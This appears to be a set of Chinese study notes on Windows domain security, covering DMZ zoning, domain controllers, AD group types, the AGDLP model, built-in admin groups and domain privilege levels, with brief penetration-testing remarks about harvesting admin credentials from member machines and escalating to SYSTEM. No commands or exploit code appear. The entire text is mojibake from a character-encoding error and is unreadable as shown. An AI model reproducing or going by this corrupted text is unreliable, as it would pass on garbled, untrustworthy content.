å¤–ç½‘å¯ä»¥è®¿é—®DMZDMZä¸­çš„æœåŠ¡å™¨éœ€è¦ä¸ºå¤–ç•Œæä¾›æœåŠ¡ï¼Œæ‰€ä»¥å¤–ç½‘å¿…é¡»å¯ä»¥è®¿é—®DMZã€‚åŒæ—¶ï¼Œå¤–ç½‘è®¿é—®DMzéœ€è¦ç”±é˜²ç«å¢™å®Œæˆå¯¹å¤–åœ°å€åˆ°æœåŠ¡å™¨å®é™…åœ°å€çš„è½¬æ¢ã€‚ DMZä¸èƒ½è®¿é—®å†…ç½‘å¦‚ä¸æ‰§è¡Œæ­¤ç­–ç•¥ï¼Œåˆ™å½“å…¥ä¾µè€…æ”»é™·DMzæ—¶ï¼Œå†…éƒ¨ç½‘ç»œå°†ä¸ä¼šå—ä¿æŠ¤ã€‚ DMZä¸èƒ½è®¿ä½•å¤–ç½‘æ­¤æ¡ç­–ç•¥ä¹Ÿæœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œåœ¨DMZä¸­æ”¾ç½®é‚®ä»¶æœåŠ¡å™¨æ—¶ï¼Œå°±éœ€è¦è®¿é—®å¤–ç½‘ï¼Œå¦åˆ™å°†ä¸èƒ½æ­£å¸¸å·¥ä½œã€‚ å†…ç½‘åˆå¯åˆ†ä¸ºåŠå…¬åŒºå’Œæ ¸å¿ƒåŒº åŠå…¬åŒºï¼šå…¬å¸å‘˜å·¥æ—¥å¸¸çš„å·¥ä½œåŒºï¼Œä¸€èˆ¬ä¼šå®‰è£…é˜²ç—…æ¯’è½¯ä»¶ã€ä¸»æœºå…¥ä¾µæ£€æµ‹äº§å“ç­‰ã€‚åŠå…¬åŒºä¸€èˆ¬èƒ½å¤Ÿè®¿é—®DMZã€‚ æ ¸å¿ƒåŒºï¼šå­˜å‚¨ä¼ä¸šæœ€é‡è¦çš„æ•°æ®ã€æ–‡æ¡£ç­‰ä¿¡æ¯èµ„äº§ï¼Œé€šè¿‡æ—¥å¿—è®°å½•ã€å®‰å…¨å®¡è®¡ç­‰å®‰å…¨æªæ–½è¿›è¡Œä¸¥å¯†çš„ä¿æŠ¤ï¼Œå¾€å¾€åªæœ‰å¾ˆå°‘çš„ä¸»æœºèƒ½è®¿é—®ã€‚ä»å¤–éƒ¨æ˜¯ç»éš¾è®¿é—®æ ¸å¿ƒåŒºçš„ã€‚ 4. åŸŸä¸­è®¡ç®—æœºåˆ†ç±»åˆ†ä¸º åŸŸæ§åˆ¶å™¨(DC)ã€æˆå‘˜æœåŠ¡å™¨ã€å®¢æˆ·æœºã€ç‹¬ç«‹æœåŠ¡å™¨ åŸŸæ§åˆ¶å™¨ï¼š åŸŸæ§åˆ¶å™¨ç”¨äºç®¡ç†æ‰€æœ‰çš„ç½‘ç»œè®¿é—®,åŒ…æ‹¬ç™»å½•æœåŠ¡å™¨ã€è®¿é—®å…±äº«ç›®å½•å’Œèµ„æºã€‚åŸŸæ§åˆ¶å™¨ä¸­å­˜å‚¨äº†åŸŸå†…æ‰€æœ‰çš„è´¦æˆ·å’Œç­–ç•¥ä¿¡æ¯,åŒ…æ‹¬å®‰å…¨ç­–ç•¥ã€ç”¨æˆ·èº«ä»½éªŒè¯ä¿¡æ¯å’Œè´¦æˆ·ä¿¡æ¯ã€‚ åœ¨ç½‘ç»œä¸­,å¯ä»¥æœ‰å¤šå°è®¡ç®—æœºè¢«é…ç½®ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œä»¥åˆ†æ‹…ç”¨æˆ·çš„ç™»å½•ã€è®¿é—®ç­‰æ“ä½œã€‚å¤šä¸ªåŸŸæ§åˆ¶å™¨å¯ä»¥ä¸€èµ·å·¥ä½œ,è‡ªåŠ¨å¤‡ä»½ç”¨æˆ·è´¦æˆ·å’Œæ´»åŠ¨ç›®å½•æ•°æ®ã€‚è¿™æ ·ï¼Œå³ä½¿éƒ¨åˆ†åŸŸæ§åˆ¶å™¨ç˜«ç—ª,ç½‘ç»œè®¿é—®ä¹Ÿä¸ä¼šå—åˆ°å½±å“ï¼Œæé«˜äº†ç½‘ç»œçš„å®‰å…¨æ€§å’Œç¨³å®šæ€§ æˆå‘˜æœåŠ¡å™¨ ï¼š æˆå‘˜æœåŠ¡å™¨æ˜¯æŒ‡å®‰è£…äº†æœåŠ¡å™¨æ“ä½œç³»ç»Ÿå¹¶åŠ å…¥äº†åŸŸã€ä½†æ²¡æœ‰å®‰è£…æ´»åŠ¨ç›®å½•çš„è®¡ç®—æœº å…¶ä¸»è¦ä»»åŠ¡æ˜¯æä¾›ç½‘ç»œèµ„æºã€‚æˆå‘˜æœåŠ¡å™¨çš„ç±»å‹é€šå¸¸æœ‰æ–‡ä»¶æœåŠ¡å™¨ã€åº”ç”¨æœåŠ¡å™¨ã€æ•°æ®åº“æœåŠ¡å™¨ã€WebæœåŠ¡å™¨ã€é‚®ä»¶æœåŠ¡å™¨ã€é˜²ç«å¢™ã€è¿œç¨‹è®¿é—®æœåŠ¡å™¨ã€æ‰“å°æœåŠ¡å™¨ç­‰ å®¢æˆ·æœºï¼š åŸŸä¸­çš„è®¡ç®—æœºå¯ä»¥æ˜¯å®‰è£…äº†å…¶ä»–æ“ä½œç³»ç»Ÿçš„è®¡ç®—æœº,ï¼Œç”¨æˆ·åˆ©ç”¨è¿™äº›è®¡ç®—æœºå’ŒåŸŸä¸­çš„è´¦æˆ·å°±å¯ä»¥ç™»å½•åŸŸã€‚è¿™äº›è®¡ç®—æœºè¢«ç§°ä¸ºåŸŸä¸­çš„å®¢æˆ·æœºã€‚ ä¹‹å‰å®‰å…¨åŸŸåˆ’åˆ†å›¾é‡Œçš„ åŠå…¬ç”µè„‘å°±æ˜¯å®¢æˆ·æœºã€‚ åŸŸç”¨æˆ·è´¦å·é€šè¿‡åŸŸçš„å®‰å…¨éªŒè¯å,å³å¯è®¿é—®ç½‘ç»œä¸­çš„å„ç§èµ„æº ç‹¬ç«‹æœåŠ¡å™¨ï¼š ç‹¬ç«‹æœåŠ¡å™¨æ˜¯æŒ‡å®‰è£…äº†æœåŠ¡å™¨æ“ä½œç³»ç»Ÿä½† å¹¶æ²¡æœ‰åŠ å…¥åŸŸã€ä¹Ÿæ²¡æœ‰å®‰è£…æ´»åŠ¨ç›®å½•çš„è®¡ç®—æœº å’ŒåŸŸæ²¡ä»€ä¹ˆå…³ç³»ã€‚ ç‹¬ç«‹æœåŠ¡å™¨å¯ä»¥åˆ›å»ºå·¥ä½œç»„ï¼Œä¹Ÿå¯ä»¥å’Œç½‘ç»œä¸Šçš„å…¶ä»–è®¡ç®—æœºå…±äº«èµ„æºï¼Œå› ä¸ºå’ŒåŸŸæ²¡æœ‰å…³ç³»ï¼Œæ‰€ä»¥ æ´»åŠ¨ç›®å½•(AD) çš„è¿™äº›èµ„æºå®ƒæ˜¯æ— æ³•äº«å—çš„ æ³¨ï¼š åŸŸæ§åˆ¶å™¨æ˜¯å­˜æ”¾æ´»åŠ¨ç›®å½•æ•°æ®åº“çš„ï¼Œæ˜¯åŸŸä¸­å¿…é¡»è¦æœ‰çš„ï¼Œè€Œå…¶ä»–ä¸‰ç§åˆ™ä¸æ˜¯å¿…é¡»çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœ€ç®€å•çš„åŸŸå¯ä»¥åªåŒ…å«ä¸€å°è®¡ç®—æœºï¼Œè¿™å°è®¡ç®—æœºå°±æ˜¯è¯¥åŸŸçš„åŸŸæ§åˆ¶å™¨ã€‚ åŸŸä¸­å„ä¸ªæœåŠ¡å™¨çš„è§’è‰²ä¹Ÿæ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œä¾‹å¦‚åŸŸæœåŠ¡å™¨åœ¨åˆ é™¤æ´»åŠ¨ç›®å½•æ—¶ï¼Œå¦‚æœæ˜¯åŸŸä¸­æœ€åä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œåˆ™è¯¥åŸŸæœåŠ¡å™¨ä¼šæˆä¸ºç‹¬ç«‹æœåŠ¡å™¨ï¼Œå¦‚æœä¸æ˜¯åŸŸä¸­å”¯ä¸€çš„åŸŸæ§åˆ¶å™¨ï¼Œåˆ™å°†ä½¿è¯¥æœåŠ¡å™¨æˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚åŒæ—¶ç‹¬ç«‹æœåŠ¡å™¨æ—¢å¯ä»¥è½¬æ¢ä¸ºåŸŸæ§åˆ¶å™¨(è£…å…¥ä¸€ä¸ªAD)ï¼Œä¹Ÿå¯ä»¥åŠ å…¥åˆ°æŸä¸ªåŸŸæˆä¸ºæˆå‘˜æœåŠ¡å™¨ã€‚ 5. åŸŸä¸­ç»„åˆ†ç±»5.1 åŸŸæœ¬åœ°ç»„åŸŸæœ¬åœ°ç»„ï¼šå¤šåŸŸç”¨æˆ·è®¿é—®å•åŸŸèµ„æºï¼ˆè®¿é—®åŒä¸€ä¸ªåŸŸï¼‰ã€‚å¯ä»¥ä»ä»»ä½•åŸŸæ·»åŠ ç”¨æˆ·è´¦æˆ·ã€é€šç”¨ç»„å’Œå…¨å±€ç»„ï¼Œåªèƒ½åœ¨å…¶æ‰€åœ¨åŸŸå†…æŒ‡æ´¾æƒé™ã€‚ åŸŸæœ¬åœ°ç»„ä¸èƒ½åµŒå¥—äºå…¶ä»–ç»„ä¸­ã€‚ å®ƒä¸»è¦æ˜¯ç”¨äºæˆäºˆä½äºæœ¬åŸŸèµ„æºçš„è®¿é—®æƒé™ã€‚ 5.2 å…¨å±€ç»„å…¨å±€ç»„ï¼šå•åŸŸç”¨æˆ·è®¿é—®å¤šåŸŸèµ„æºï¼ˆå¿…é¡»æ˜¯åŒä¸€ä¸ªåŸŸé‡Œé¢çš„ç”¨æˆ·ï¼‰ã€‚åªèƒ½åœ¨åˆ›å»ºè¯¥å…¨å±€ç»„çš„åŸŸä¸Šè¿›è¡Œæ·»åŠ ç”¨æˆ·å’Œå…¨å±€ç»„ï¼Œå¯ä»¥åœ¨åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå…¨å±€ç»„å¯ä»¥åµŒå¥—åœ¨å…¶ä»–ç»„ä¸­ã€‚ æœ‰å¾ˆå¤šçš„å…¨å±€ç»„ï¼Œå¯ä»¥æŠŠDomain ComputersåŠ å…¥Domain Adminså…¨å±€ç»„ä¸­ï¼Œä½†æ˜¯ä¸èƒ½åŠ å…¥åˆ°å…¶ä»–å…¨å±€ç»„çš„åŸŸä¸­ã€‚ 5.3 å…¨å±€ç»„ä¸åŸŸæœ¬åœ°ç»„åŒºåˆ«å…¨å±€ç»„ç›¸å½“äºåŸŸè´¦å·ï¼Œå¯ä»¥åœ¨å…¨å±€ä½¿ç”¨ï¼ŒåŸŸæœ¬åœ°ç»„ç›¸å½“äºæœ¬åœ°è´¦å·ï¼Œåªèƒ½æœ¬æœºä¸Šä½¿ç”¨ã€‚ ä¸‹é¢æˆ‘æ¥ä¸¾ä¸¤ä¸ªä¾‹å­æ¥è¿›ä¸€æ­¥è¯´æ˜ï¼ˆä»¥æ··åˆæ¨¡å¼ä¸‹ä¸ºä¾‹ï¼‰ï¼š ä¾‹1ï¼šå°†ç”¨æˆ·å¼ ä¸‰ï¼ˆåŸŸå¸å·Z3ï¼‰åŠ å…¥åˆ°åŸŸæœ¬åœ°ç»„administratorsä¸­ï¼Œå¹¶ä¸èƒ½ä½¿Z3å¯¹ éDC çš„ åŸŸæˆå‘˜è®¡ç®—æœº æœ‰ä»»ä½•ç‰¹æƒï¼Œä½†è‹¥åŠ å…¥åˆ°å…¨å±€ç»„Domain Adminsä¸­ï¼Œå¼ ä¸‰å°±æ˜¯åŸŸç®¡ç†å‘˜äº†ï¼Œå¯ä»¥åœ¨å…¨å±€ä½¿ç”¨ï¼Œå¯¹åŸŸæˆå‘˜è®¡ç®—æœºæ˜¯æœ‰ç‰¹æƒçš„ã€‚ ä¾‹2ï¼šåªæœ‰åœ¨åŸŸçš„DCä¸Šï¼Œå¯¹èµ„æºï¼ˆå¦‚ï¼šæ–‡ä»¶/å¤¹ï¼‰è®¾ç½®æƒé™ï¼Œä½ å¯ä»¥æŒ‡æ´¾åŸŸæœ¬åœ°ç»„administratorsï¼›ä½†åœ¨éDCçš„åŸŸæˆå‘˜è®¡ç®—æœºä¸Šï¼Œä½ æ˜¯æ— æ³•è®¾ç½®åŸŸæœ¬åœ°ç»„administratorsçš„æƒé™çš„ã€‚å› ä¸ºå®ƒæ˜¯åŸŸæœ¬åœ°ç»„ï¼Œåªèƒ½åœ¨è¯¥åŸŸDCä¸Šä½¿ç”¨ 5.4 é€šç”¨ç»„é€šç”¨ç»„ï¼Œé€šç”¨ç»„æˆå‘˜æ¥è‡ªåŸŸæ—ä¸­ä»»ä½•åŸŸä¸­çš„ç”¨æˆ·è´¦æˆ·ã€å…¨å±€ç»„å’Œå…¶ä»–çš„é€šç”¨ç»„ï¼Œå¯ä»¥åœ¨è¯¥åŸŸæ—ä¸­çš„ä»»ä½•åŸŸä¸­æŒ‡æ´¾æƒé™ï¼Œå¯ä»¥åµŒå¥—äºå…¶ä»–åŸŸç»„ä¸­ã€‚éå¸¸é€‚äºåŸŸæ—ä¸­çš„è·¨åŸŸè®¿é—® é€šå¸¸ç”¨äºä¸ç»å¸¸å‘ç”Ÿå˜åŒ–çš„ç”¨æˆ·ã€‚ç»„æˆå‘˜ä¿¡æ¯ä¿å­˜åœ¨ GC é‡Œã€‚ 5.5 AGDLPç­–ç•¥ A (account):ç”¨æˆ·å¸æˆ· G (Global group):å…¨å±€ç»„ DL (Domain local group):åŸŸæœ¬åœ°ç»„ P (Permissionè®¸å¯):è¡¨ç¤ºèµ„æºæƒé™ A-G-DL-Pç­–ç•¥æ˜¯å°†ç”¨æˆ·è´¦å·æ·»åŠ åˆ°å…¨å±€ç»„ä¸­ï¼Œå°†å…¨å±€ç»„æ·»åŠ åˆ°åŸŸæœ¬åœ°ç»„ä¸­ï¼Œç„¶åä¸ºä¸æœ¬åœ°ä½åˆ†é…èµ„æºæƒé™ã€‚æŒ‰ç…§AGDLPçš„åŸåˆ™å¯¹ç”¨æˆ·è¿›è¡Œç»„ç»‡å’Œç®¡ç†èµ·æ¥æ›´å®¹æ˜“ åœ¨AGDLPå½¢æˆä»¥åå½“ç»™ä¸€ä¸ªç”¨æˆ·æŸä¸€ä¸ªæƒé™çš„æ—¶å€™,åªè¦æŠŠè¿™ä¸ªç”¨æˆ·åŠ å…¥åˆ°æŸä¸€ä¸ªæœ¬åœ°åŸŸç»„å°±å¯ä»¥äº†ã€‚ ä¸¾ä¸ªä¾‹å­æ¯”å¦‚ï¼šæœ‰ä¸¤ä¸ªåŸŸï¼ŒAå’ŒBï¼ŒAä¸­çš„5ä¸ªè´¢åŠ¡äººå‘˜å’ŒBä¸­çš„3ä¸ªè´¢åŠ¡äººå‘˜éƒ½éœ€è¦è®¿é—®Bä¸­çš„â€œFINAâ€æ–‡ä»¶å¤¹ã€‚è¿™æ—¶ï¼Œå¯ä»¥åœ¨Bä¸­å»ºä¸€ä¸ªDL(åŸŸæœ¬åœ°ç»„)ï¼Œå› ä¸ºDLçš„æˆå‘˜å¯ä»¥æ¥è‡ªæ‰€æœ‰çš„åŸŸï¼Œç„¶åæŠŠè¿™8ä¸ªäººéƒ½åŠ å…¥è¿™ä¸ªDLï¼Œå¹¶æŠŠFINAçš„è®¿é—®æƒèµ‹ç»™DLã€‚è¿™æ ·åšçš„åå¤„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºDLæ˜¯åœ¨BåŸŸä¸­ï¼Œæ‰€ä»¥ç®¡ç†æƒä¹Ÿåœ¨BåŸŸï¼Œå¦‚æœAåŸŸä¸­çš„5 ä¸ªäººå˜æˆ6ä¸ªäººï¼Œé‚£åªèƒ½AåŸŸç®¡ç†å‘˜é€šçŸ¥BåŸŸç®¡ç†å‘˜ï¼Œå°†DLçš„æˆå‘˜åšä¸€ä¸‹ä¿®æ”¹ï¼ŒBåŸŸçš„ç®¡ç†å‘˜å¤ªç´¯äº†ã€‚è¿™æ—¶å€™ï¼Œæˆ‘ä»¬æ”¹å˜ä¸€ä¸‹ï¼Œåœ¨Aå’ŒBåŸŸä¸­éƒ½å„å»ºç«‹ä¸€ä¸ªå…¨å±€ç»„ï¼ˆGï¼‰ï¼Œç„¶ååœ¨BåŸŸä¸­å»ºç«‹ä¸€ä¸ªDLï¼ŒæŠŠè¿™ä¸¤ä¸ªGéƒ½åŠ å…¥BåŸŸä¸­çš„DLä¸­ï¼Œç„¶åæŠŠFINAçš„è®¿é—®æƒèµ‹ç»™ DLã€‚å“ˆå“ˆï¼Œè¿™ä¸‹ä¸¤ä¸ªGç»„éƒ½æœ‰æƒè®¿é—®FINAæ–‡ä»¶å¤¹äº†ï¼Œæ˜¯å—ï¼Ÿç»„åµŒå¥—é€ æˆæƒé™ç»§æ‰¿å˜›ï¼è¿™æ—¶å€™ï¼Œä¸¤ä¸ªGåˆ†å¸ƒåœ¨Aå’ŒBåŸŸä¸­ï¼Œä¹Ÿå°±æ˜¯Aå’ŒBçš„ç®¡ç†å‘˜éƒ½å¯ä»¥è‡ªå·±ç®¡ç†è‡ªå·±çš„Gå•¦ï¼Œåªè¦æŠŠé‚£5ä¸ªäººå’Œ3ä¸ªäººåŠ å…¥Gä¸­ï¼Œå°±å¯ä»¥äº†ï¼ä»¥åæœ‰ä»»ä½•ä¿®æ”¹ï¼Œéƒ½å¯ä»¥è‡ªå·±åšäº†ï¼Œä¸ç”¨éº»çƒ¦BåŸŸçš„ç®¡ç†å‘˜ï¼è¿™å°±æ˜¯A-G-DL-Pã€‚ A-G-DL-Pç­–ç•¥æ˜¯å°†ç”¨æˆ·è´¦å·æ·»åŠ åˆ°å…¨å±€ç»„ä¸­ï¼Œå°†å…¨å±€ç»„æ·»åŠ åˆ°åŸŸæœ¬åœ°ç»„ä¸­ï¼Œç„¶åä¸ºåŸŸæœ¬åœ°ç»„åˆ†é…èµ„æºæƒé™ã€‚ ç®€å•æ¥è¯´ï¼š åŸŸæœ¬åœ°ç»„ï¼šæ¥è‡ªå…¨æ—ã€ä½œç”¨äºæœ¬åŸŸ å…¨å±€ç»„ï¼šæ¥è‡ªæœ¬åŸŸã€ä½œç”¨äºå…¨æ— é€šç”¨ç»„ï¼šæ¥è‡ªå…¨æ—ã€ä½œç”¨äºå…¨æ— 5.6 ç†Ÿæ‚‰å„ä¸ªç»„æœ¬åœ°åŸŸç»„çš„æƒé™ï¼š Administratorsï¼ˆç®¡ç†å‘˜ç»„ï¼‰ ç®¡ç†å‘˜ç»„(Administrators)çš„æˆå‘˜å¯ä»¥ä¸å—é™åˆ¶çš„å­˜å–è®¡ç®—æœº/åŸŸèµ„æºã€‚å®ƒä¸ä»…æ˜¯æœ€å…·æƒåŠ›çš„ä¸€ä¸ªç»„ï¼Œä¹Ÿæ˜¯åœ¨æ´»åŠ¨ç›®å½•å’ŒåŸŸæ§åˆ¶å™¨ä¸­é»˜è®¤å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç»„ Remote Desktop Usersï¼ˆè¿œç¨‹ç™»å½•ç»„ï¼‰æˆäºˆç»„å†…æˆå‘˜è¿œç¨‹ç™»å½•çš„æƒé™ Print Operatorsï¼ˆæ‰“å°æœºæ“ä½œå‘˜ç»„ï¼‰å¯ä»¥ç®¡ç†ã€å»ºç«‹ã€åˆ é™¤ç½‘ç»œæ‰“å°æœº Account Operatorsï¼ˆå¸å·æ“ä½œå‘˜ç»„ï¼‰å¯ä»¥åˆ›å»ºå’Œç®¡ç†åŸŸä¸­ç”¨æˆ·å’Œç»„ï¼Œå¹¶å¯ä»¥è®¾ç½®å®ƒçš„æƒé™ã€‚ä½†æ˜¯å®ƒæ˜¯ä¸èƒ½æ›´æ”¹ç®¡ç†å‘˜ç»„çš„è´¦å·çš„ Server Operatersï¼ˆæœåŠ¡å™¨æ“ä½œå‘˜ç»„ï¼‰å¯ä»¥ç®¡ç†åŸŸæœåŠ¡å™¨ã€‚å¯ä»¥å»ºç«‹ã€åˆ é™¤ä»»ä½•åŸŸæœåŠ¡å™¨é‡Œçš„å…±äº«ç›®å½•ã€‚å…³é”å®šæœåŠ¡å™¨ã€å˜æ›´æœåŠ¡å™¨çš„æ—¶é—´ã€å…³é—­åŸŸæ§åˆ¶å™¨ç­‰ç­‰ Backup Operatorsï¼ˆå¤‡ä»½æ“ä½œå‘˜ç»„ï¼‰ åœ¨åŸŸæ§åˆ¶å™¨ä¸Šæ‰§è¡Œå¤‡ä»½ï¼Œè¿˜åŸæ“ä½œã€‚ä¹Ÿå¯ä»¥æœ¬åœ°ç™»å½•å’Œå…³é—­åŸŸæ§åˆ¶å™¨ã€‚ å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™ï¼š Domain Adminsï¼ˆåŸŸç®¡ç†å‘˜ç»„ï¼‰åŸŸç®¡ç†å‘˜ç»„ã€è¯¥ç»„æŒ‡å®šçš„åŸŸç®¡ç†å‘˜ï¼Œæ‹¥æœ‰å®Œæ•´çš„ç®¡ç†å‘˜æƒé™ã€‚å› ä¸ºè¯¥ç»„ä¼šè¢«æ·»åŠ åˆ°è‡ªå·±æ‰€åœ¨åŸŸçš„Administrators ç»„ä¸­ï¼Œå› æ­¤å¯ä»¥ç»§æ‰¿Administratorsç»„çš„æ‰€æœ‰æƒé™ã€‚åŒæ—¶ è¯¥ç»„é»˜è®¤ä¼šè¢«æ·»åŠ åˆ°æ¯å°åŸŸæˆå‘˜è®¡ç®—æœºæœ¬åœ°çš„Administratorsç»„ä¸­ï¼Œå› æ­¤ Domain adminsç»„ å¯¹åŸŸå†…æ‰€æœ‰è®¡ç®—æœºéƒ½æœ‰ç®¡ç†æƒé™ã€‚ æ˜¯æœ€æœ€é‡è¦çš„æƒé™ï¼Œä¸€èˆ¬æ¥è¯´åŸŸæ¸—é€æ˜¯çœ‹é‡è¿™ä¸ª Enterprise Adminsï¼ˆä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ï¼‰é™¤äº†åŸŸç®¡ç†å‘˜ç»„ï¼Œç¬¬äºŒé‡è¦çš„ç»„ ä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ æ˜¯åŸŸæ£®æ—æˆ–è€…æ ¹åŸŸä¸­çš„ä¸€ä¸ªç»„ã€‚è¯¥ç»„åœ¨åŸŸæ£®æ—ä¸­çš„æ¯ä¸ªåŸŸå†…éƒ½æ˜¯Administratorsç»„çš„æˆå‘˜ï¼Œå› æ­¤å¯¹æ‰€æœ‰åŸŸæ§åˆ¶å™¨éƒ½æœ‰å®Œå…¨è®¿é—®æƒ Schema Adminsï¼ˆæ¶æ„ç®¡ç†å‘˜ç»„ï¼‰ç¬¬ä¸‰é‡è¦æ˜¯æ¶æ„ç®¡ç†å‘˜ç»„ã€‚å¯ä»¥ç®¡ç†æ´»åŠ¨ç›®å½• Domain Usersï¼ˆåŸŸç”¨æˆ·ç»„ï¼‰ 6. åŸŸå†…æƒé™è§£è¯»WindowsåŸŸç¯å¢ƒä¸­ï¼Œæ‰€æœ‰çš„æƒé™éƒ½ä¿å­˜åœ¨åŸŸæ§åˆ¶å™¨ä¸­çš„æ´»åŠ¨ç›®å½•é‡Œã€‚å®æˆ˜ä¸­æœ‰ä¸¤ç§æ–¹å¼èƒ½è·å¾—æƒé™ã€‚ 1. è·å¾—åŸŸæ§æƒé™å¹¶ä¿®æ”¹åŸŸæ§ä¸­çš„æ´»åŠ¨ç›®å½•é‡Œçš„æƒé™ åœ¨åŸŸæˆå‘˜æœºå™¨ä¸­å¯»æ‰¾åŸŸæ§æ›¾ç»ç™»å½•è¿‡çš„è´¦å·å¯†ç è·å¾—æƒé™ 6.1 ç”¨æˆ·ç™»å½•æœºå™¨åŠ å…¥åˆ°åŸŸä¹‹å å¯ä»¥é€‰æ‹©ä½¿ç”¨åŸŸå†…ç”¨æˆ·ç™»å½•ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æœ¬åœ°ç”¨æˆ·ç™»å½• åŒºåˆ«å¦‚ä¸‹ï¼š æœ¬åœ°ç”¨æˆ·ç™»å½•ï¼Œæ˜¯å­˜æ”¾åœ¨æœ¬åœ°æ–‡ä»¶ä¸­ç„¶åæœ¬æœºè¿›è¡Œæ ¡éªŒã€‚åŸŸå†…ç”¨æˆ·ç™»å½•ï¼Œæ˜¯è¦é€šè¿‡ï¼¤ï¼£çš„è®¤è¯ä¹‹åæ‰èƒ½ç™»å½•ï¼Œç”¨æˆ·ä¿¡æ¯å­˜æ”¾åœ¨åŸŸæ§ä¸Š æœ¬åœ°ç”¨æˆ·ç™»å½•ä¸»è¦æ˜¯å¯¹æ¯”NTLM HASHå€¼ , åŸŸè®¤è¯æ˜¯é€šè¿‡Kerberos è®¤è¯ æœºå™¨å¯ä»¥é€‰æ‹©æœ¬åœ°ç™»å½•æˆ–è€…åŸŸç”¨æˆ·ç™»å½•,æœ¬åœ°ç”¨æˆ· æœºå™¨å\\ç”¨æˆ·å åŸŸå†…ç”¨æˆ· åŸŸå\\ç”¨æˆ·å 6.2 åŸŸå†…æœ€é«˜ç®¡ç†å‘˜æƒé™åŸŸå†…æœ€é«˜ç®¡ç†å‘˜æƒé™å°±æ˜¯ åŸŸå\\administrator, ä»–æ²¡æœ‰UACè®¤è¯,ä»–ä¹Ÿæ˜¯æ¯ä¸ªåŸŸå†…æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜,å’Œæœºå™¨å\\administrator å…·æœ‰ç›¸åŒçš„æƒé™,SIDä¹Ÿæ˜¯500 6.3 åŸŸå†…æ™®é€šç®¡ç†å‘˜æƒé™åŸŸå†…æ™®é€šç®¡ç†å‘˜å°±æ˜¯åŠ å…¥äº†åŸŸä¸­çš„Domain Adminsç»„é‡Œçš„åŸŸç”¨æˆ·,ä½†ä¸æ˜¯administratorç”¨æˆ· è·Ÿæœ¬åœ°æ™®é€šç®¡ç†å‘˜æƒé™æ˜¯ä¸€æ ·çš„,æƒ³æ‰§è¡Œé«˜æƒé™çš„æ“ä½œå¿…é¡»å³é”®ä½¿ç”¨ç®¡ç†å‘˜æ‰“å¼€ 6.4 åŸŸå†…æ™®é€šç”¨æˆ·æƒé™åŸŸç”¨æˆ·ç»„(Domain Users) ä¸­æ‰€æœ‰çš„åŸŸæˆå‘˜. é»˜è®¤æƒ…å†µä¸‹ æˆ‘ä»¬å»ºç«‹çš„ç”¨æˆ·è´¦å·éƒ½å±äº Domain Usersç»„,è¯¥ç»„åœ¨åŸŸå†…æœºå™¨ä¸­å­˜åœ¨äºUsersç»„ è·Ÿæœ¬åœ°æ™®é€šç”¨æˆ·çš„æƒé™æ˜¯ä¸€æ ·çš„ 6.5 æœºå™¨ç”¨æˆ·å’ŒSYSTEM åŒºåˆ«Domain Computersç»„,ä»»ä½•ç”±æˆ‘ä»¬å»ºç«‹çš„è®¡ç®—æœºè´¦å·éƒ½å±äºè¯¥ç»„ , æœºå™¨è´¦æˆ·æ˜¯æŒ‡åœ¨ç½‘ç»œä¸­ç”¨äºä»£è¡¨è®¡ç®—æœºæˆ–è®¾å¤‡çš„è´¦æˆ·. åœ¨WindowsåŸŸç¯å¢ƒä¸­ , æ¯å°è®¡ç®—æœºéƒ½æœ‰ä¸€ä¸ªæœºå™¨è´¦æˆ· , ç”¨äºåœ¨ç½‘ç»œä¸­è¿›è¡Œèº«ä»½è®¤è¯å’Œæˆæƒ æœºå™¨è´¦æˆ·çš„åç§° é€šå¸¸ä¸ºè®¡ç®—æœºåç§°, æœºå™¨è´¦æˆ·ä¸å…·ä½“è®¡ç®—æœºç›¸å…³è” , ç”¨äºä»£è¡¨è®¡ç®—æœºè¿›è¡ŒåŸŸè®¤è¯å’Œè®¿é—®åŸŸèµ„æº å½“ç”µè„‘åŠ å…¥åˆ°åŸŸä¸­ä¹‹å , æœºå™¨è´¦å·çš„å¯†ç ä¹ŸåŒæ­¥åˆ°åŸŸæ§ä¸Š , æ‰€ä»¥æœ¬åœ°çš„ SYSTEMç”¨æˆ·å¯¹åº”åŸŸå†…çš„æœºå™¨ç”¨æˆ·. å¦‚æœæˆ‘ä»¬æ‹¿åˆ°æƒé™çš„ç”µè„‘åŠ å…¥äº†åŸŸ , ä½†æ˜¯ä½¿ç”¨çš„æ˜¯æœ¬åœ°ç”¨æˆ·è¿›è¡Œç™»å½• , è¿™æ—¶ æˆ‘ä»¬å°±å¯ä»¥ææƒåˆ° SYSTEMç”¨æˆ·,ç„¶åå¯¹åŸŸå†…è¿›è¡ŒæŸ¥è¯¢ è™½ç„¶ SYSTEM è´¦æˆ·æ˜¯æœ¬åœ°è®¡ç®—æœºä¸Šçš„ç‰¹æ®Šè´¦æˆ· , è€Œæœºå™¨è´¦æˆ·æ˜¯åŸŸç¯å¢ƒä¸­çš„è´¦æˆ· , ä½†åœ¨æŸäº›æƒ…å†µä¸‹, ä¾‹å¦‚: å½“æœ¬åœ°iè®¡ç®—æœºéœ€è¦è®¿é—® åŸŸèµ„æºæ—¶, SYSTEM è´¦æˆ·å¯èƒ½ä¼šå……å½“æœºå™¨è´¦æˆ·çš„è§’è‰² . è¿™æ˜¯å› ä¸ºåœ¨åŸŸç¯å¢ƒä¸­ï¼Œæœ¬åœ°è®¡ç®—æœºå¯ä»¥ä½¿ç”¨ SYSTEM è´¦æˆ·ä½œä¸ºå…¶èº«ä»½è¿›è¡ŒåŸŸè®¤è¯å’Œè®¿é—®æˆæƒã€‚ 